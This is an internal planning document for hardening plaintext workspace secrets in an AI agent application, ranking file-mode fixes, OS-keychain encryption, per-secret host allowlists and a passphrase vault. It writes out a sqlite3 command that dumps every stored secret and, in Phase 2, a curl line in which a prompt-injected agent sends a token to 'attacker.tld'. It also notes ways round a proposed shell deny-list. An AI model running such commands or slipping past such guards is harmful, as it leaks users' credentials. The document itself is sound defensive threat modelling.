# Workspace secrets at rest — hardening options

**Origin:** kanban `task_1791715855920_3` — *"any idea how to make key value more secure?"*, raised against a
screenshot of `SELECT * FROM workspace_secrets` showing `value` in the clear.

**Status:** PLANNING ONLY. This PR adds one markdown file and no code. The reviewer picks a row out of
[§5](#5-the-options-ranked-by-risk-reduction--effort); implementation lands separately.

**Non-goal:** changing how the {{SECRETS:NAME}} placeholder is substituted. [§2](#2-who-can-read-a-value-today)
shows why that half of the feature is already sound and should not be touched while doing this.

---

## 1. What is stored today

All verified first-hand in this worktree on 2026-10-11, not carried over from the old plan.

| Fact | Evidence |
|---|---|
| `value` is a plaintext `TEXT NOT NULL`. | `src/migrations/migration_103.zig:20` |
| Plaintext is a **recorded reviewer decision**, not an oversight — *"Deliberate, reviewer-decided: no master key, no cipher."* | `src/migrations/migration.zig:11437-11444` |
| The store's own header states the same rule, so the next reader does not "fix" it by accident. | `src/agentic_loop/secrets_store.zig:19-22` |
| Exactly **one** SQL statement in the codebase selects a value, and one function uses it (`loadSecretValues`). | `src/agentic_loop/secrets_store.zig:109-112`, called at `:353` |
| No HTTP route returns a value. The list response type has no value field; there is no `GET …/secrets/:id`. | `src/http_handlers/http_response.zig:1404`, `src/http_routes.zig:544-547` |
| The frontend keeps no value: it is dropped into the request body and never stored in a ref. | `src/apps/desktop/src/stores/secrets.ts` |
| A resolved value is redacted back out of the tool result before it is persisted or streamed. | `src/agentic_loop/secrets_substitution.zig` (module header) |

**The value therefore exists in exactly one place outside a live request: the database file.**

### 1.1 The file, as shipped on this machine

```
755  ~/.config/pabrik
644  ~/.config/pabrik/agent.db        4.4 GB
644  ~/.config/pabrik/agent.db-wal
644  ~/.config/pabrik/agent.db-shm
```

Mode `0644` on a multi-user host means any local account can read the table outright. And `agent.db` is
4.4 GB in a real install, so "someone copies or backs up that file" is a normal event, not a hypothetical.

---

## 2. Who can read a value today

| # | Who | Can they read a value today? | Why |
|---|---|---|---|
| A | Another local OS user / process | **Yes** | `agent.db` is `0644`; the whole config dir is `0755` |
| B | A process running as *this* user — **including the agent's own `command` tool** | **Yes, in one tool call** | see below |
| C | A copied, backed-up or repo-embedded `agent.db` | **Yes** | encryption is the only thing that makes this copy inert |
| D | The browser / another app user of the same workspace | No | value never crosses HTTP; every read is `WHERE workspace_id = ?` |
| E | The model, *by the substitution path* | No | placeholder in, redacted out; the design holds |
| E′ | The model, by asking the OS | **Yes** | same as (B) |

### 2.1 (B) is the one that matters, and it is one command

`command` spawns `bash -c` with **no allowlist** — `is_forbidden_command` is a stub that returns `false`
for every input, with the comment *"temporary disabled forbidden command"*
(`src/modules/agent/tools/shell.zig:948-957`). `read_file.zig` contains **no** sandbox check;
`file_sandbox.zig` governs only "may this file be shown to the browser" (`present_files`, file download),
not reads.

So, from inside the agent:

```sh
sqlite3 ~/.config/pabrik/agent.db 'SELECT name, value FROM workspace_secrets'
```

Verified reachable: `sqlite3` is on `PATH` (`/home/ginwa/Android/Sdk/platform-tools/sqlite3`) and answers
against the live DB — `SELECT COUNT(*), SUM(LENGTH(value)) FROM workspace_secrets` returned `2|15`
(deliberately counts and lengths, never the values themselves).

That single call yields **every secret in every workspace**, and the tool result is persisted into
`llm_history` — so the credential ends up in the same database it was read from, on its way to the
provider. This is precisely the outcome the whole placeholder feature exists to prevent.

None of this is new. The acceptance note in the old plan rev 2 said it in as many words —
*"With plaintext storage that is a one-command exfiltration"*
(`git show 93b2322b:docs/superpowers/plans/2026-10-02-workspace-secrets.md`). It shipped as a **known,
accepted caveat** of DD2. The question this plan answers is whether that caveat is still worth accepting.

---

## 3. What a cipher actually buys here — and what it does not

The recorded rationale for plaintext is: the key would sit in the same config dir as the DB, so a
compromised home directory yields both anyway, while every backup and copied `.db` would have been inert —
*"that trade was judged not worth a crypto module, a key-file lifecycle, and three platform-conditional
code paths."*

Half of that is right and half of it is not, and the difference decides how much to spend:

| Key custody | (A) other local user | (B) same-user process / the agent | (C) copied or backed-up `.db` |
|---|---|---|---|
| **none — today** | reads value | reads value | reads value |
| OS keychain / Credential Manager, no key file | cannot get the key | `secret-tool` / Credential Manager *as the same user* still works while the session is unlocked — but it is now a second, auditable step, not a file read | **inert** ✅ |
| passphrase, held only in server memory | cannot | cannot (must dump process memory) | **inert** ✅ |
| *rejected:* key file `0600` beside the DB | cannot read the key, cannot read the value | reads both → decrypts | inert |

Read that table honestly:

- The recorded argument is **correct for row (B)** — no at-rest scheme with a locally available key stops a
  process running as the user. Only the passphrase row does.
- It is **wrong for row (C)**. "Every backup, every copied `.db` would have been inert" is the *benefit*,
  presented as the cost. A 4.4 GB file that gets copied to a laptop, a NAS, a support bundle or a
  `docker cp` is the single most likely way a credential leaves this machine, and it is the cheapest threat
  to defeat.
- It is **wrong for row (A)** for a reason that has nothing to do with cryptography: the file is `0644`.

So the honest ladder is: **file modes get most of (A) for ~20 lines; an OS keychain gets all of (C) without
writing key material anywhere; only a passphrase meaningfully addresses (B).** The plan below keeps those
three concerns separate instead of pretending one cipher solves all of them.

**Decision (reviewer, 2026-10-11): there is no `secrets.key`.** Key material is never written into the
config dir, not even as a fallback — a cipher whose key sits in the file it protects is a ceremony. The cost
is stated plainly in [§7.4](#74-key-custody-per-platform): on a host with no OS keychain (headless Linux, a
container, CI) Phase 1 has nothing to seal with, so that host stays on plaintext — visibly, never silently —
and Phase 3's passphrase becomes the only way to seal it.

---

## 4. Scope: the other plaintext credentials

`workspace_secrets` is not the only credential on disk, and by value it is not the biggest one:

| What | Where | Today |
|---|---|---|
| LLM provider `api_key` | `~/.config/pabrik/config.json` (`src/modules/config/Config.zig:117`, written/read at `:812`, `:874`) | plaintext, `0644` |
| MCP server header values | `users.config_json` (returned to the browser by `GET /api/config/nalar`) | plaintext |
| Workspace secret values | `workspace_secrets.value` | plaintext |

Securing only the smallest of the three while the provider key — the one that bills money — stays in the
clear would be a stale win, so **§5 Phase 1 is written as a reusable helper with `config.json` as its second
consumer.** If the reviewer wants the change to stay narrow, say so and Phase 1 covers only
`workspace_secrets`; that is a one-line scoping decision, not a design change.

---

## 5. The options, ranked by risk-reduction ÷ effort

### Phase 0 — file hygiene, lifecycle discipline, and the cheap denial paths (≈ half a day)

Nothing here is a cipher and all of it is independently worth doing:

1. **`0700` on `~/.config/pabrik`, `0600` on `agent.db` + `-wal` + `-shm`.** Created by
   `helpers/db_path.zig:66` (`createDirPath`) and by SQLite itself, neither of which sets a mode. Set the
   mode at creation and repair an existing directory on boot.
2. **`PRAGMA secure_delete = ON`**, so a rotated or deleted value does not survive in the file's free
   pages — today "delete a secret" leaves the credential in `agent.db` indefinitely.
3. **Zeroize the loaded value after dispatch** (`loadSecretValues` → `freeSecretValueRows`), so a live
   credential stops living in freed heap pages and core dumps.
4. **Deny the agent its own direct read path**: a check in `shell.zig` for the config dir / `agent.db` /
   `workspace_secrets`, and a read guard in `read_file.zig` for `~/.config/pabrik/**`.
   *Defense in depth, not a fix* — `cp` + parse elsewhere, or python's `sqlite3` module, walks around it.
   Worth it anyway, and it is where the `is_forbidden_command` stub should come back.
5. A functional test asserting the file mode and that `SELECT value` is not returned by any route.

**Buys:** attacker (A) outright, +1 step for (B). **Cost:** hours. **Risk:** low — but (4) is a
false-positive source, so it needs a narrow, tested pattern rather than a fuzzy one.

### Phase 1 — envelope encryption, key held by the OS keychain, never on disk (≈1.5–2 days) — *recommended*

`std.crypto.aead.aes_gcm.Aes256Gcm` and `std.crypto.hkdf` are already in the toolchain
(`/usr/lib/zig/std/crypto/aes_gcm.zig`, Zig 0.16.0). **No new dependency.** The repo already has this
precedent on another platform: the Android app seals values with AES-GCM under an Android Keystore key
(`src/apps/android_mobile/.../storage/SealingCipher.kt`, `EncryptedPrefs.kt`). The desktop/server side has
no equivalent yet — this closes that asymmetry.

Details in [§7](#7-phase-1-design-details-so-the-reviewer-can-price-it).

**Buys:** (C) completely, (A) completely, (B) partially — **but only on a host that has a keychain**
([§7.4](#74-key-custody-per-platform)). **Cost:** a crypto module, an envelope format, a key lifecycle and
three platform paths — the exact price the original reviewer declined, now paid by value instead of by
column.

### Phase 2 — per-secret capability allowlist (≈1–2 days) — *the highest-leverage control for (B)*

Independent of at-rest encryption, and arguably a bigger win for the threat this feature was built around.

Today a resolved value may be substituted into **any** tool parameter, including `command`. So a
prompt-injected model can write:

```sh
curl -s -H "Authorization: Bearer {{SECRETS:GITHUB_TOKEN}}" https://attacker.tld/collect
```

The redaction layer cannot help: the credential left through the network, and the response is empty. Nothing
in the current design constrains *where* a secret may go — only that it is not echoed back.

Proposal: per secret, optional `allowed_tools` and `allowed_hosts` (the destination host, for `command` and
the HTTP-ish tools), plus `expires_at` and `last_used_at`. `last_used_at` also gives the UI something true to
show instead of "Updated …", and a "used 3 minutes ago from an unexpected host" is the only signal a user
would ever get. Default policy is a reviewer decision — see [§10](#10-open-questions-for-the-reviewer).

**Buys:** much of (E′) — the *use* of a credential by a call the user never intended. **Cost:** a policy
check at the single substitution seam plus schema. **Risk:** low; the seam is one function.

### Phase 3 — passphrase-locked vault (≈3–5 days, opt-in)

Argon2id (`std.crypto.pwhash.argon2`) over a user passphrase, key held in server memory only. Server starts
**locked**: `stored` values cannot be written or substituted, the placeholder fails with a clear message,
the UI shows a locked state, and `POST /api/secrets/unlock` opens it. `PABRIK_SECRETS_PASSPHRASE` for
headless runs.

**This is the only option that addresses (B).** It also has a real, ugly consequence that must be a decision
rather than a discovery: the unattended paths — `cronjob`, routines, kanban workers — need secrets while
nobody is at the keyboard, which means the passphrase lives in the environment, which the agent's own
`command` tool can read out of `/proc/self/environ`. Opt-in, documented, and *not* the default.

### Rejected

| Option | Why not |
|---|---|
| Base64 / XOR / "encryption" with a key in the source | Theater. Worse than plaintext, because it stops people looking. |
| Key derived from the `--auth` password hash (`auth_common.zig:347-355`) | Local, no-auth is the primary deployment and there is no password to derive from; the server must also run unattended. |
| Key file in the same config dir as `config.json` | The rev-1 mistake, **rejected outright (reviewer, 2026-10-11)** — not even as a fallback, because it makes the cipher a function of the very file it exists to protect. A host without a keychain stays plaintext and says so. |
| Whole-DB encryption (SQLCipher-style) | Needs a dependency and rewrites the DB layer to protect one column; still does not stop (B). |
| Sandbox-only (`read_file` + `shell` deny-list) as *the* fix | Bypassable by any second interpreter. Phase 0 item, not a plan. |
| "Don't store secrets, let users use their own env" | Changes the product to avoid the problem. |

---

## 6. Recommended sequencing

1. **Phase 0 now**, in the same PR as Phase 1 — mode bits, `secure_delete`, zeroization, deny-list.
2. **Phase 1 as the answering change to this task's question** — the stored value stops being readable in
   the file, and the module header gets an honest new disclaimer ([§7.6](#76-what-the-header-must-say)).
3. **Phase 2 next**, because it is the only thing that constrains the credential's *use*.
4. **Phase 3 for any host without a keychain, or when the stolen-laptop case is real.** With no key file it
   is the *only* way a headless box ever seals, which lifts it above "paranoid option" — but it still breaks
   unattended runs, so it stays opt-in and per-host rather than the default.

---

## 7. Phase 1 design details (so the reviewer can price it)

### 7.1 Envelope format

```
v1:<key_id>:<base64url(nonce || ciphertext || tag)>
```

- AES-256-GCM, 12-byte random nonce per write, 16-byte tag. Fresh nonce per write is asserted by a test
  (two seals of the same plaintext differ).
- **AAD = `v1:<secret_id>`.** The id is immutable and unique, so a row copied, moved or renamed by someone
  with DB write access fails to open instead of decrypting into the wrong secret. (`name` is deliberately
  *not* in the AAD: the frontend exposes a rename.)
- `key_id` = first 8 hex of `SHA-256(master_key)`, so "wrong key" and "corrupt row" are different errors and
  a re-key needs no schema change.
- **No prefix, or `v0:`, means legacy plaintext and is read as-is.** A half-migrated DB, an unsealed row and
  a value written while the vault was unavailable all keep working. This is the rule that keeps the feature
  from bricking.
- Per-workspace subkeys via `HKDF(master_key, salt=workspace_id)` are cheap and give room for a future
  per-workspace re-key; optional, and not worth doing if it is not going to be used.

### 7.2 Where the sealing pass runs

**Not inside a SQL migration.** The migration chain must stay runnable on a headless boot where no key is
obtainable, and `migration_103.up` is pure `db.exec`. Instead: a small boot-time pass after migrations,
`secrets_at_rest.sealLegacyRows(db, key)`, in one transaction, no-op for rows already prefixed. If the key
cannot be obtained, the pass is skipped, the server boots, and the feature keeps working in plaintext —
degraded and *legible*, never broken.

### 7.3 The gotcha that makes "we encrypted it" true or false

After re-sealing, the **old plaintext still exists in the file**: in free pages, and in already-written WAL
frames (`agent.db-wal` is 64 MB here). Encryption is therefore not done until
`PRAGMA secure_delete=ON` + `wal_checkpoint(TRUNCATE)` + `VACUUM` have run, and the only assertion worth
trusting is the one in [§9](#9-verification): grep the raw file bytes for the plaintext and find nothing.

### 7.4 Key custody, per platform

| Platform | Provider | Key material on disk? |
|---|---|---|
| Linux | freedesktop Secret Service via `secret-tool store/lookup` (libsecret); **absent on most headless boxes** | no — the daemon owns it |
| macOS | Keychain via `security add-generic-password` / `find-generic-password` — always present | no |
| Windows | **Credential Manager** (`CredWrite` / `CredRead`, or `cmdkey`), not DPAPI over a file of ours | no |

The providers are reached by spawning the platform CLI (the app already spawns processes and has no C crypto
bindings), behind one `KeyProvider` interface. **There is no `file` implementation** — reviewer decision,
2026-10-11. Two consequences, both deliberate:

- **No keychain ⇒ no sealing.** `KeyProvider` reports `unavailable`, the boot seal pass is skipped, writes go
  in plaintext, and the state is **visible**: a boot log line plus an "at-rest encryption unavailable on this
  host" note in the Secrets section. A missing keyring is never a startup failure — CI and containers have no
  D-Bus session — but it is never silently papered over either.
- **A copied `.db` is only inert where a keychain exists.** The headless box — the machine whose database is
  the one that actually gets copied — is the single host where Phase 1 buys nothing. That is precisely why
  Phase 3 stops being optional there.

### 7.5 Failure states the code must distinguish

`sealed` / `legacy-plaintext` (readable, will be sealed on next write) / `unavailable` (no key: writes go in
plaintext, logged at boot **and rendered in the Secrets section** — with no key file, this state is a normal
host condition, not an incident) / `wrong-key` (a row that will not open because `key_id` differs).
Collapsing any of the last three into "empty secret" is exactly the failure mode this repo has a rule
about.

### 7.6 What the header must say

The rev-1/2 wording must not come back as "secure storage". Replacement, in
`secrets_store.zig`'s header and at `migration.zig:11437`:

> `value` is sealed with AES-256-GCM under a key held by the OS keychain — never a key file. **Where the
> host has no keychain, the value is stored in plaintext, deliberately and visibly.** **This protects the
> database file — backups, copies, another local account — not the account.** A process running as the same
> user can obtain the key and decrypt; the substitution path, not this cipher, is what keeps a value away
> from the model.

Replacing the *plaintext* disclaimer with that is the point of the phase, not boilerplate.

---

## 8. Files this will touch

| Phase | Create | Modify |
|---|---|---|
| 0 | — | `src/helpers/db_path.zig`, `src/modules/agent/tools/shell.zig`, `src/modules/agent/tools/read_file.zig`, `src/boot/server_boot.zig` (pragmas) |
| 1 | `src/agentic_loop/secrets_at_rest.zig` (seal/open/envelope/key provider), `src/boot/secrets_key.zig` | `src/agentic_loop/secrets_store.zig` (write path seals, `loadSecretValues` opens), `src/agentic_loop/mod.zig`, `src/boot/server_boot.zig` (seal pass), `src/migrations/migration.zig` (comment only), `src/modules/config/Config.zig` (if §4 is in scope) |
| 2 | — | `src/agentic_loop/secrets_substitution.zig` (policy check at the seam), `secrets_store.zig` + Migration NNN (`allowed_tools`, `allowed_hosts`, `expires_at`, `last_used_at`), `secrets_create/update.zig`, `SecretsSection.vue` |
| 3 | `src/agentic_loop/secrets_vault.zig` | routes + handlers, `server_boot.zig`, `SecretsSection.vue`, `stores/secrets.ts` |

No new dependencies in any phase. `pgvector` is not involved.

---

## 9. Verification

Zig unit tests (`zig build test`):

- seal/open round-trip; two seals of one plaintext differ (fresh nonce); flipped ciphertext byte fails to
  open; a row with a different `id` fails the AAD check; a legacy plaintext row still reads; an unavailable
  key produces the `unavailable` state rather than an empty secret.
- **the assertion that proves the claim**: write a sentinel secret, seal it, `VACUUM` + checkpoint, read the
  raw `agent.db` bytes, assert the sentinel does not appear. Without this the phase is unfalsifiable.

Functional (Zig, `tests/functional/`, `zig build functional-test`):

- `POST` a secret then `GET` the list: no value in the body (extends `workspace_secrets_test.zig`).
- the file mode of `agent.db` and the config dir.
- **Never bind 8081** — `tests/functional/harness.py:145` reserves it; the harness picks 8080+.

Phase 2 additionally needs a test at the seam: an allowlisted host substitutes, a non-allowlisted host
refuses *with a named error*, and no value appears in the refusal.

---

## 10. Open questions for the reviewer

1. ~~**Key file fallback.**~~ **Resolved (reviewer, 2026-10-11): no `secrets.key`.** The question that
   replaces it is only what a keychain-less host shows the user: allow the plaintext write with a visible
   "unavailable" state ([§7.4](#74-key-custody-per-platform)), or refuse to store the secret at all there?
   Allowing keeps the feature working; refusing turns the gap into a wall.
2. **Scope.** `workspace_secrets` only, or the LLM `api_key` and MCP headers too ([§4](#4-scope-the-other-plaintext-credentials))?
3. **Phase 2 default policy.** Allowlist-empty = deny (every new secret needs an entry and the first tool
   call after creating one fails) or permissive with a warning? Deny-by-default is the secure answer and the
   annoying one.
4. **Unattended runs vs Phase 3.** Do `cronjob` / routines need secrets? If yes, the passphrase has to be in
   the environment, which the agent can read. Either keep Phase 3 opt-in and say so, or add an explicit
   `secret_use` approval step for the agent.
5. **The disclaimer.** Keep [§7.6](#76-what-the-header-must-say)'s honest wording in the module header and
   the migration comment, even though it admits what the cipher does not cover?
6. **Is Phase 0 alone enough for now?** If the answer to "who are you protecting this from?" is "other local
   users and my backups", then mode bits + `secure_delete` + the deny-list is the whole job and Phases 1–3
   are optional. If it is "the agent itself", only Phase 3 answers it.

---

## 11. Summary

| | Phase 0 | Phase 1 | Phase 2 | Phase 3 |
|---|---|---|---|---|
| Stops another local user | ✅ | ✅ | | ✅ |
| Makes a copied/backed-up DB inert | ❌ | ✅ (where a keychain exists) | | ✅ |
| Stops the agent reading the file | ~ | ~ | | ✅ |
| Stops the agent *using* a secret against an unintended host | ❌ | ❌ | ✅ | ✅ |
| Cost | ~0.5 d | ~1.5–2 d | ~1–2 d | ~3–5 d |
| UX change | none | none | first-use friction | unlock prompt / env var |
| Breaks unattended runs | no | no | possible (deny default) | yes, unless the passphrase is in the env |

**Recommendation:** Phase 0 + Phase 1 as the answer to this task, Phase 2 as the immediate follow-up, and
Phase 3 for any host without a keychain — with no key file, a passphrase is the only thing that can seal one.
Phase 1 on its own is worth it for §3 row (C) alone; it should just never be described as more than that.
